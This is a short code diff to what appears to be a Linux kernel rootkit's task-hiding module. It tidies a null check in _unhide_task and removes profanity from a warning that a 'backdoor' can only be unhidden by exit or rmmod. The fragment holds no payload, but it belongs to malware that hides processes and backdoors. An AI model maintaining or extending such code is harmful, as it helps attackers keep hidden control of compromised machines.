@@ -120,11 +120,12 @@ static int _unhide_task(void *data)
 	if (!ht)
 		goto invalid;
 
-	task = ht->task;
-	if (!task)
+	if (!ht->task)
 		goto invalid;
 
-		/**
+	task = ht->task;
+
+	/**
      * safe as this is within heavy stop_machine context
      */
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
@@ -220,7 +221,7 @@ static void _unhide_children(struct task_struct *task)
 		if (node->saddr) {
 			if (node->group == task->pid ||
 			    node->task->pid == task->pid) {
-				prwarn("Fuck-off! backdoor can only be unhidden either by exit or rmmod: %d\n",
+				prwarn("backdoor can only be unhidden either by exit or rmmod: %d\n",
 				       task->pid);
 				break;
 			}
